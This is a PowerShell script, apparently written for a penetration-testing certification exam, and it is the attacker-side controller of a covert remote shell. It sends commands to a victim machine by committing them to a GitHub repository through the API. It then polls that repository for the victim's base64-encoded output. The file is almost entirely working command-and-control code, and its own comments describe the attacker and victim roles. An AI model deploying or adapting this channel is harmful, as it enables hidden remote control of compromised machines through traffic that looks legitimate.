function Master
{ 
<#
.SYNOPSIS
A PowerShell script that use the GitHub API for interactive shell.

.DESCRIPTION A PowerShell script that use the GitHub API for interactive shell. this code is devided to tow parts
 onw will be in the attacker said and the other will be in the victem machein the commands and the result will be added to the github repo that assighned .

.PARAMTER token
genreted by github.

.PARAMTER URIgit
this is the link for the repo .
.PARAMTER URIout
the URL will read the response from  .
.PARAMTER wait
the wait time to the master write command to execute in the butenet.
.PARAMTER commitMessage
The commit message.

.PARAMTER committerName
The author of the commit.

.PARAMTER committerEmail
The email of the author of the commit.

.EXAMPLE
PS C:\> . .\ser.ps1
PS C:\> Master -token *************************  -URIgit https://api.github.com/repos/username/repo/contents/command.txt
.LINK
https://developer.github.com/v3/repos/contents/
https://github.com/blog/1509-personal-api-tokens
https://stackoverflow.com/questions/43868915/powershell-invoke-webrequest-with-full-content


.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID:3270
#>
[CmdletBinding()] Param( 

       [Parameter(Mandatory = $true)]
       [String]
       $token ,

       [Parameter(Mandatory = $false)]
       [String]
       $URIgit = "https://api.github.com/repos/username/repo/contents/command.txt",
       [Parameter(Mandatory = $false)]
       [String]
       $URIout = "https://api.github.com/repos/username/repo/contents/out.txt",
       [Parameter(Mandatory = $false)]
       [int]
       $wait = 30,

       [Parameter(Mandatory = $false)]
       [String]
       $crMessage = "test",

       [Parameter(Mandatory = $false)]
       [String]
       $crName = "name",

       [Parameter(Mandatory = $false)]
       [String]
       $crEmail = 'defult@defult.com'

)

#set github parameters
$auth = @{"Authorization"="token $token"}
$committer = @{"name"=$crName; "email"=$crEmail}

while (1) {
$files = New-Object System.Collections.ArrayList
$Toexcute = Read-Host -Prompt 'Input a command'
$ContentBytes = [System.Text.Encoding]::UTF8.GetBytes($Toexcute) 
$ContentEncode = [System.Convert]::ToBase64String($ContentBytes)


#prepare the request 
$data = @{"message"=$crMessage; "committer"=$committer; "content"=$ContentEncode }
$JsonData = ConvertTo-Json $data


# here will send request in the rty part with new file request if there are an issue we will get the sha value the contunue 
try {
    $req = Invoke-WebRequest -Headers $auth -Method PUT -Body $JsonData -Uri $URIgit -UseBasicParsing
}
catch {
    $req = Invoke-WebRequest -Headers $auth -Method Get -Uri $URIgit  -UseBasicParsing
    #converting the rsponse from json to text to get the sha value
    $GetSha = $req | ConvertFrom-Json
    $sha = $GetSha.sha


    $data = @{"message"=$crMessage; "committer"=$committer; "content"=$ContentEncode ; "sha"=$sha }
    $JsonData1 = ConvertTo-Json $data
    $req = Invoke-WebRequest -Headers $auth -Method PUT -Body $JsonData1 -Uri $URIgit -UseBasicParsing
    }
    if (($req.StatusCode -eq 201 ) -or ($req.StatusCode -eq 200 )) 
    {
        write-verbose "greate the command has been sent:) " 
    }
    else {
        Write-Host "there were an issue "
    }
    #sterint the wait function to wait for a command
    Start-Sleep -s $wait
    # here we will get the response and add it to our ArrayList 
    $req = Invoke-WebRequest -Headers $auth -Method Get -Uri $URIout  -UseBasicParsing
    $Getname = $req | ConvertFrom-Json
    $Hname = $Getname.name
    $files.Add($Hname)

    foreach ($file in $files){
        $FileReq = Invoke-WebRequest -Headers $auth -Method Get -Uri $URIout  -UseBasicParsing
        $getcontent = $FileReq | ConvertFrom-Json
        $contet = $getcontent.content
        $base64 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($contet))
        write-host "NAME:"$file -ForegroundColor Green
        write-host $base64
        Write-Host
    }
}
}



